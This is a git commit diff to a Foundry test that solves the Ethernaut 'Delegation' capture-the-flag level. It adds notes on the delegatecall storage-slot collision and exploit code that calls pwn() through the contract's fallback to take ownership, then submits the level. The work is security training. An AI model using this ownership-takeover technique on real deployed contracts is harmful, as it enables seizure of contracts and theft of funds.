55c7b28952790d5bae1da09d323a7f3ff4d7bf52
Craigson <craigpick@gmail.com>
2022-08-27 10:31:34 -0400

    complete 06_delegation

--- ethernaut-x-foundry/src/test/06_Delegation.t.sol
+++ ethernaut-x-foundry/src/test/06_Delegation.t.sol
@@ -5,6 +5,15 @@ import "../Delegation/DelegationFactory.sol"; // <====== REPLACE THIS
 import "../Ethernaut.sol";
 import "./utils/vm.sol";
 
+/*
+    Solution Notes:
+    - use the delegation callback to call the pwn function by encoding the 
+    fn call using its signature
+    - `owner` for both contracts occupy the same storage slot, so calling the function
+    using delegate call changes the storage in the caller's slot, not hte contract
+    being called
+*/
+
 contract DelegationHack is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
@@ -34,13 +43,25 @@ contract DelegationHack is DSTest {
         Delegation ethernaughtDelegation = Delegation(payable(levelAddress));
 
         // =========================  ATTACK
+        emit log_named_address(
+            "owner of delegation before: ",
+            ethernaughtDelegation.owner()
+        );
 
+        (bool success, ) = address(ethernaughtDelegation).call{value: 0}(
+            abi.encodeWithSignature("pwn()")
+        );
+
+        emit log_named_address(
+            "owner of delegation after: ",
+            ethernaughtDelegation.owner()
+        );
         // ========================= SUBMISSION
 
-        // bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
-        //     payable(levelAddress)
-        // );
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
         vm.stopPrank();
-        // assert(levelSuccessfullyPassed);
+        assert(levelSuccessfullyPassed);
     }
 }
